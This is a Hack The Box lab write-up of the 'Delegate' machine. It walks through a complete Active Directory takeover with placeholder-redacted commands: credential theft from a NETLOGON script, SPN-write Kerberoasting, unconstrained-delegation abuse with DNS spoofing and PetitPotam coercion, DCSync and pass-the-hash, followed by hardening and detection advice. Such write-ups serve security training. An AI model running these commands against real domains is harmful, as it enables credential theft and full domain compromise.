---
title: "Delegate — Active Directory Unconstrained Delegation via NETLOGON Script Credentials"
description: "NETLOGON script credentials and GenericWrite over a delegation admin enable Kerberoasting, PetitPotam coercion, and DCSync."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - kerberos
  - delegation
objective: "Escalate from a guest-readable NETLOGON logon script to domain administrator control by abusing an over-permissive ACL and unconstrained delegation."
tools:
  - NetExec
  - rusthound-ce
  - BloodHound
  - bloodyAD
  - hashcat
  - Impacket
  - krbrelayx
  - petitpotam
  - evil-winrm
skill: "Active Directory delegation abuse and credential-chain analysis"
outcome: "Domain administrator access via domain controller TGT capture, DCSync, and pass-the-hash"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Active Directory domain (`<DOMAIN>`) with the domain controller as the single target host |
| Starting position | Unauthenticated network access; guest SMB access to readable shares |
| Objective | Escalate from a guest-readable NETLOGON logon script to domain administrator control by abusing an over-permissive ACL and unconstrained delegation |
| Outcome | Domain administrator access via domain controller TGT capture, DCSync, and pass-the-hash |

## From a logon script to unconstrained delegation

Delegate is a Medium-rated Hack The Box Windows Active Directory lab. A guest-readable NETLOGON logon script exposes a reusable credential, directory analysis shows the recovered user holds `GenericWrite` over a second account, and that account's delegation-group membership supports an unconstrained-delegation attack that coerces the domain controller into revealing its TGT and finishes with DCSync. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Guest-readable NETLOGON script → cleartext credential → `GenericWrite` → SPN Kerberoasting → delegation-admin machine account with unconstrained delegation → DNS spoof + PetitPotam coercion → DC TGT capture → DCSync → pass-the-hash domain administrator**

## Domain controller, guest SMB, and the escalation objective

- **Target:** a Windows Active Directory domain (`<DOMAIN>`) whose domain controller (`<DOMAIN_CONTROLLER_FQDN>`) hosts the domain services.
- **Starting position:** unauthenticated network access; guest SMB login is accepted and exposes domain-readable shares.
- **Objective:** move from a readable logon script to domain administrator control by following the directory's authorization edges and delegation configuration.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: logon script to DCSync

The source captures little raw tool output; apart from the logon-script and recovered-password excerpts, the remaining stages are recorded as narrative results.

### 1. Credential Discovery in the NETLOGON Share

Observation: a guest SMB session can spider readable shares, and a logon script on the NETLOGON share contains an embedded credential.

```bash
nxc smb <TARGET_IP> -u 'Guest' -p '' -M spider_plus
nxc smb <TARGET_IP> -u 'Guest' -p '' \
  --share NETLOGON --get-file users.bat ./users.bat
```

Recovered script contents:

```text
if %USERNAME%==<INITIAL_DOMAIN_USER> net use h: \\<FILE_SERVER>\backups /user:<DOMAIN_ADMINISTRATOR> <CLEARTEXT_PASSWORD>
```

Significance: a domain-readable logon script stores a reusable credential in cleartext, and guest access means no authentication is needed to retrieve it.

Result: `<CLEARTEXT_PASSWORD>` was recovered and subsequently validated through LDAP authentication as `<INITIAL_DOMAIN_USER>` in the next stage.

### 2. Directory Analysis — GenericWrite Edge

Observation: collecting directory data with `rusthound-ce` and analysing it in BloodHound reveals that `<INITIAL_DOMAIN_USER>` holds `GenericWrite` over `<DELEGATION_USER>`.

```bash
rusthound-ce -d '<DOMAIN>' -u '<INITIAL_DOMAIN_USER>@<DOMAIN>' -p '<CLEARTEXT_PASSWORD>' -z
```

Significance: `GenericWrite` over a user object allows an attacker to write an arbitrary `servicePrincipalName`, which makes the account Kerberoastable without any password-reset rights.

Result: directory analysis confirmed `<INITIAL_DOMAIN_USER>` can modify the `<DELEGATION_USER>` object.

### 3. SPN Abuse and Kerberoasting

Observation: the `GenericWrite` edge permits writing a `servicePrincipalName` value onto `<DELEGATION_USER>`, after which a Kerberos service ticket can be requested and cracked offline.

```bash
bloodyAD -d "<DOMAIN>" --host "<DOMAIN_CONTROLLER_FQDN>" \
  -u "<INITIAL_DOMAIN_USER>" -p "<CLEARTEXT_PASSWORD>" \
  set object "<DELEGATION_USER>" servicePrincipalName -v "http/<SERVICE_NAME>"

nxc ldap <DOMAIN_CONTROLLER_FQDN> -d "<DOMAIN>" \
  -u "<INITIAL_DOMAIN_USER>" -p "<CLEARTEXT_PASSWORD>" \
  --kerberoasting kerberoast.txt
```

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

Recovered password:

```text
<KERBEROASTED_PASSWORD>
```

Significance: an SPN written through `GenericWrite` turns a normal user account into a Kerberoastable service identity, and the resulting service ticket can be cracked offline with no further interaction against the target.

Result: the `<DELEGATION_USER>` password was recovered and subsequently validated through WinRM using `evil-winrm`, giving a user-level shell.

### 4. Unconstrained Delegation Chain

Observation: `<DELEGATION_USER>` belongs to a delegation-administration group, which supports creating a machine account and marking it trusted for delegation.

```bash
impacket-addcomputer <DOMAIN>/<DELEGATION_USER>:<KERBEROASTED_PASSWORD> \
  -computer-name '<RELAY_MACHINE_ACCOUNT>' -dc-ip <TARGET_IP>

bloodyAD -d <DOMAIN> --dc-ip <TARGET_IP> \
  -u <DELEGATION_USER> -p '<KERBEROASTED_PASSWORD>' \
  add uac '<RELAY_MACHINE_ACCOUNT>' -f TRUSTED_FOR_DELEGATION
```

DNS and SPN manipulation then direct the domain controller's authentication toward the attacker-controlled relay host:

```bash
python3 dnstool.py -u '<DOMAIN>\<DELEGATION_USER>' -p '<KERBEROASTED_PASSWORD>' \
  -r <RELAY_FQDN> -d <ATTACKER_IP> --action add <TARGET_IP>

python3 addspn.py -u '<DOMAIN>\<DELEGATION_USER>' -p '<KERBEROASTED_PASSWORD>' \
  -s 'cifs/<RELAY_HOST>' -t '<RELAY_MACHINE_ACCOUNT>' -dc-ip <TARGET_IP> <TARGET_IP>
```

PetitPotam coerces the domain controller into authenticating to the relay, where the delegation setting captures its ticket:

```bash
python3 PetitPotam.py -target-ip <TARGET_IP> \
  -u '<RELAY_MACHINE_ACCOUNT>' -p '<RELAY_PASSWORD>' <RELAY_HOST> <DOMAIN_CONTROLLER_FQDN>
```

Capture marker from the relay:

```text
# Got <DOMAIN_CONTROLLER_MACHINE>$ TGT
```

Significance: unconstrained delegation makes the relay collect the TGT of any principal that authenticates to it; spoofed DNS plus authentication coercion forces the domain controller to connect, capturing a reusable TGT for the domain controller machine account.

Result: the domain controller's TGT was captured in a credential cache file and carried forward to replication.

### 5. DCSync and Domain Compromise

Observation: a domain controller TGT permits directory replication, so the account's stored hashes can be extracted without a service exploit.

```bash
KRB5CCNAME='<DOMAIN_CONTROLLER_CCACHE>' \
  impacket-secretsdump -just-dc-user <DOMAIN_ADMINISTRATOR> -k <DOMAIN_CONTROLLER_FQDN>
```

Significance: DCSync with the captured ticket yields domain credential material, and a pass-the-hash session converts the recovered NT hash into administrative access without cracking it.

```bash
evil-winrm -i <TARGET_IP> -u <DOMAIN_ADMINISTRATOR> -H <ADMIN_NT_HASH>
```

Result: an administrative pass-the-hash session establishes domain administrator access.

## Challenges and Decisions

No failed attempts, blockers, or mid-chain corrections are documented for this chain; each stage completed and supplied the input for the next.

## Outcome: domain administrator via DCSync and pass-the-hash

The evidence establishes domain administrator access on the target domain controller.

Limitation: apart from the logon-script and recovered-password excerpts, the source presents each stage as a narrative result rather than captured tool output, so intermediate proof rests on the recorded descriptions rather than raw transcripts.

## Recommendations: script credentials, GenericWrite, delegation, and coercion

The actions below are recommendations; none was validated in the lab.

1. **Cleartext credentials in a NETLOGON logon script.** A domain-readable script stored a reusable password. *Impact:* an unauthenticated guest recovered a working domain credential. *Recommendation:* remove credentials from logon scripts and use managed identities or a credential vault; restrict who can write to NETLOGON. *Detection:* alert on guest or anonymous SMB reads of NETLOGON and on credential-shaped strings in script files.
2. **Over-permissive object control (`GenericWrite`).** A standard user held write rights over another user object. *Impact:* an arbitrary SPN could be written, enabling Kerberoasting of the target account. *Recommendation:* audit and remove non-essential write ACLs on user objects and enforce least privilege. *Detection:* alert on `servicePrincipalName` writes to user objects by non-administrative principals.
3. **Unconstrained delegation.** Accounts or machine accounts trusted for delegation accumulated reusable tickets. *Impact:* once coercion forced the domain controller to authenticate to the relay, its TGT was captured. *Recommendation:* eliminate unconstrained delegation and replace it with constrained or resource-based constrained delegation scoped to specific services.
4. **Authentication-coercion exposure (PetitPotam).** The domain controller could be coerced into authenticating to an attacker-chosen host. *Impact:* the forced authentication delivered the domain controller's TGT to the relay. *Recommendation:* apply current vendor hardening for authentication-coercion techniques, require SMB signing and Extended Protection for Authentication, and disable unnecessary remote interface access.

## References

- [Hack The Box — Delegate](https://app.hackthebox.com/machines/Delegate) (retired machine)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and LDAP operations, Kerberoasting)
- [BloodHound](https://github.com/SpecterOps/BloodHound) (Active Directory attack-path analysis)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) (directory object attribute and ACL manipulation)
- [Impacket](https://github.com/fortra/impacket) (machine-account creation and DCSync)
- [KrbRelayX](https://github.com/dirkjanm/krbrelayx) (`dnstool.py` and `addspn.py`)
- [PetitPotam](https://github.com/topotam/PetitPotam) (authentication coercion)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM sessions and pass-the-hash)
- [Hashcat](https://hashcat.net/hashcat/) (offline Kerberos ticket cracking)
- [Kerberos Constrained Delegation Overview — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
